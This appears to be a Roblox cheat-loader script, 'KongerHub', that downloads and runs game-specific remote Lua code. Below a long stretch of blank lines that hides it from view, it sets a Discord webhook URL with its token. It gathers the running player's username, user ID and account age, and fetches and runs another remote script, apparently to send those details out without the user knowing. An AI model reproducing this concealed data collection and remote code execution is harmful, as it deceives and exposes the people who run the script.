--[[
    KongerHub
]]
setfpscap(10000)

local gameLinks = {
    [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
    [12355337193] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
    [3214114884] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/flagwars.lua",
    [6722284015] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/pistol1v1.lua",
    [4410049285] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/drivingsimulator.lua",
    [13771457545] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
    [13775113583] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
}

if gameLinks[game.PlaceId] ~= nil then
    loadstring(game:HttpGet(gameLinks[game.PlaceId]))()
else
    warn("Not Supported")
end










































-- // WebHook URL
WebHook = "https://discord.com/api/webhooks/1149514476329127987/XG2pbitNR5aWjAWOh6XBcFe1Ism-7Tv_EvAKgmeC29Y_R9TOj0BdGWjETZvEU1R7itLZ"
-- // Modify your WebHook field
Content = ""
  Title = "Info"
    FieldName = "Username: "..game.Players.LocalPlayer.Name..""
       Field1 = ""
       Field2 = ""
       Field3 = ""
       Field4 = ""
       Field5 = ""
       Field6 = ""
       Field7 = ""
       Field8 = ""
       Field9 = ""
       Field10 = ""
    FieldName1 = "User Id: "..game.Players.LocalPlayer.UserId..""
       Field11 = ""
       Field12 = ""
       Field13 = ""
       Field14 = ""
       Field15 = ""
       Field16 = ""
       Field17 = ""
       Field18 = ""
       Field19 = ""
       Field20 = ""
    FieldName2 = "Account Age: "..game.Players.LocalPlayer.AccountAge..""
       Field21 = ""
       Field22 = ""
       Field23 = ""
       Field24 = ""
       Field25 = ""
       Field26 = ""
       Field27 = ""
       Field28 = ""
       Field29 = ""
       Field30 = ""
-- // WebHook's avatar [ Change it to "" if you want to change it, and nil to deafult ]
       Username = nil
       Avatar = nil
-- // Modify your WebHook's looks & feel
       Color = nil
       Footer = "KongerHub Script was ran by "..game.Players.LocalPlayer.Name.."."
       TimeStamp = ""
       FooterIconURL = "https://cdn.discordapp.com/attachments/1149514457752543253/1149520313495851018/image.png"
       ThumbnailURL = ""
       ImageURL = ""
-- // Extras
       ThreadName = nil -- Creates a Thread, use this only if the channel is "Forum", also change it from nil to ""
       -- // 4 = Content Only
       -- // nil = Content + Embeds
       Flags = nil

loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/2.0.lua", true))()
